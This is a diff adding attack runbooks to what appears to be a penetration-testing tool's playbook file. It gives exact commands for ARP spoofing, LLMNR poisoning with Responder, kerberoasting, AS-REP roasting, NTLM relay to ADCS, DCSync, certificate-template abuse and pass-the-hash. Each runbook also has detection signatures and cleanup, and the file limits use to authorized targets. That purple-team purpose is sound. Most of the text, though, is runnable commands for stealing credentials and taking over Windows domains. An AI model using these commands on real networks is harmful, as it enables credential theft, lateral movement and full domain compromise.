@@ -499,3 +499,81 @@ The defensive mirror of adchain:
 triage collect (Velociraptor artifacts) -> detect ioc (LOKI/YARA) -> memforensics
 (Volatility3 on a dump) -> netmon pcap (Zeek+Suricata on the capture) -> intel (enrich
 the IOCs) -> finding -> report. triage live stands up a Velociraptor GUI for hunting.
+
+## attacks — technique-level attack playbooks (index)
+Concrete, runnable attack runbooks (ARP-level detail): goal, exact commands, the
+sygnif-py tool that wraps it, the blue-side detection signature, and cleanup. AUTHORIZED,
+in-scope targets only; every step obeys SCOPE.md, the STOP kill-switch, the rate limit,
+and --confirm. Sections: arp | llmnr | kerberoast | asrep | relay | dcsync | esc1 | passhash.
+Pair each with its detection via `playbook section=purpleloop`.
+
+## arp — ARP spoofing / MITM (Layer 2, own LAN segment)
+Goal: sit between a target host and its gateway to read/modify its traffic.
+Prereq: on the same broadcast domain; note the target IP + gateway (arp -a).
+1. Enable forwarding so the victim keeps connectivity: `sysctl -w net.ipv4.ip_forward=1`.
+2. Poison both directions. bettercap (modern): `bettercap -iface eth0 -eval "set arp.spoof.targets <victim>; arp.spoof on; net.sniff on"`.
+   ettercap (the classic, as in the Bombal walkthrough): `ettercap -T -i eth0 -M arp:remote /<victim>// /<gateway>//`.
+   arpspoof (minimal): `arpspoof -i eth0 -t <victim> <gateway>` + reverse in a second shell.
+3. Capture/inspect: Wireshark/tshark on eth0, or bettercap's net.sniff. HTTPS is not
+   plaintext — HSTS/cert pinning defeat sslstrip; value is unencrypted protocols, creds
+   on legacy services, and traffic analysis.
+Tool: run via `kali` / `shell` (no dedicated wrapper). Detection: gratuitous ARP / a MAC
+mapping to two IPs — `netmon` (Zeek notice, Suricata ARP-spoof rules), arpwatch.
+Cleanup: stop the tool (ettercap re-ARPs on exit), `sysctl -w net.ipv4.ip_forward=0`.
+
+## llmnr — LLMNR / NBT-NS / mDNS poisoning (internal initial creds)
+Goal: answer broadcast name-resolution to capture NetNTLM hashes — the classic no-creds
+internal foothold.
+1. `responder -I eth0 -wv` (answers LLMNR/NBT-NS/mDNS, runs rogue WPAD/SMB/HTTP).
+2. Wait for a mistyped share / auto name-lookup; Responder logs NetNTLMv2 hashes.
+3. Crack: `crack` tool (hashcat -m 5600) — or feed the `relay` playbook instead of cracking.
+Tool: `kali` (responder), then `crack`. Detection: rogue LLMNR/NBT-NS responders,
+unexpected WPAD — `netmon` + a canary name lookup. Note: relaying beats cracking when
+SMB signing is off (see `relay`).
+
+## kerberoast — request + crack service tickets
+Goal: any domain user can request TGS tickets for accounts with an SPN; crack offline for
+the service account password.
+1. `ad mode=kerberoast domain=<d> user=<u> password=<p> target=<dc>` (wraps impacket
+   GetUserSPNs -request). 2. Crack the $krb5tgs$ hashes: `crack` (hashcat -m 13100).
+Detection: a spike of TGS-REQ (event 4769) with RC4 (0x17) from one principal. Feeds
+`purpleloop` (ATT&CK T1558.003).
+
+## asrep — AS-REP roasting (no creds needed for the target)
+Goal: accounts with "do not require pre-auth" hand out an AS-REP crackable offline.
+1. `ad mode=asrep domain=<d> users=<userlist> target=<dc>` (impacket GetNPUsers -no-pass).
+2. Crack: `crack` (hashcat -m 18200). Detection: 4768 AS-REQ with pre-auth not required
+(T1558.004).
+
+## relay — coercion + NTLM relay (no-creds → DA chain)
+Goal: force a target to authenticate to you, relay that auth to a service where SMB
+signing is off → creds/exec, or to ADCS (ESC8) → a DC certificate.
+1. Start the relay: `coerce mode=relay relay_to=<target-or-ADCS-URL> target=<t>
+   authorization=...` (impacket ntlmrelayx, e.g. `--target http://<CA>/certsrv/certfnsh.asp
+   --adcs --template DomainController`). 2. Coerce: `coerce mode=coerce target=<victim-DC>
+   listener=<your-ip> ...` (Coercer / PetitPotam). 3. Use the relayed cert/creds →
+   `ad secretsdump` or `esc1`. Detection: SMB auth from an unexpected host, EPM/RPC coerce
+   calls — `netmon`. Requires SMB signing not enforced on the relay target.
+
+## dcsync — replicate secrets from a DC
+Goal: with Domain-Admin-equivalent or Replicating-Directory-Changes rights, pull all
+domain hashes (incl. krbtgt for a golden ticket).
+1. `ad mode=secretsdump domain=<d> user=<u> password=<p|hash> target=<dc>` (impacket
+   secretsdump, DRSUAPI). Detection: DRSUAPI replication (4662 with the replication GUIDs)
+   from a non-DC — a high-fidelity alert (T1003.006). Loud; expect it to fire.
+
+## esc1 — ADCS certificate abuse (ESC1-class → DA)
+Goal: a misconfigured cert template (enrollee-supplies-subject + client-auth) lets you
+enroll a cert as any user, then auth as them.
+1. Find: `ad mode=certipy domain=<d> user=<u> password=<p> target=<dc>` (certipy find
+   -vulnerable). 2. Request as a target: `certipy req -template <T> -upn administrator@<d>
+   -ca <CA>` (via `kali`). 3. Auth with the cert: `certipy auth -pfx administrator.pfx` →
+   TGT/NT hash → `ad secretsdump` / `winrm`. Detection: cert enrollment with a SAN that
+   mismatches the requester (T1649).
+
+## passhash — pass-the-hash / lateral movement
+Goal: reuse an NT hash (no plaintext) to authenticate and run commands.
+1. Validate + spray the hash across hosts: `ad mode=exec target=<host> user=<u> hash=<NT>
+   command=whoami` (NetExec -H). 2. Interactive: `winrm mode=exec target=<host> user=<u>
+   hash=<NT> command=...` (evil-winrm PtH). Detection: same account on many hosts in a
+   short window, type-3 logons (4624 LogonType 3) from one source (T1550.002).
